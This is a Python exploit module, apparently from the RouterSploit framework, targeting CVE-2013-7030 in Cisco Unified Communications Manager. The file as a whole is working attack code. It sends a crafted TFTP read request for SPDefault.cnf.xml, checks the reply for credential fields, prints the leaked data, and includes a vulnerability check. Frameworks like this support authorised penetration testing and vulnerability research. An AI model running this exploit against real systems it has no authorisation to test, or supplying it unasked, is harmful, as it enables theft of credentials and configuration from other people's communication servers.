from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient


class Exploit(UDPClient):
    __info__ = {
        "name": "Cisco UCM Info Disclosure",
        "description": "Module exploits information disclosure vulnerability in Cisco UCM devices. "
                       "If the target is vulnerable it is possible to read sensitive information through TFTP service.",
        "authors": (
            "Daniel Svartman <danielsvartman[at]gmail.com",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/30237/",
            "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-7030",
        ),
        "devices": (
            "Cisco UCM",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(69, "Target port")

    def __init__(self):
        self.payload = b'\x00\x01' + b'SPDefault.cnf.xml' + b'\x00' + b'netascii' + b'\x00'

    def run(self):
        print_status("Sending payload")
        udp_client = self.udp_create()
        udp_client.send(self.payload)

        response = udp_client.recv(2048)

        if response and len(response):
            if b"UseUserCredential" in response:
                print_success("Exploit success - file {}".format("SPDefault.cnf.xml"))
                print_info(response)
            else:
                print_error("Exploit failed - credentials not found in response")
        else:
            print_error("Exploit failed - empty response")

    @mute
    def check(self):
        udp_client = self.udp_create()
        udp_client.send(self.payload)

        response = udp_client.recv(2048)

        if response and len(response) and b"UseUserCredential" in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
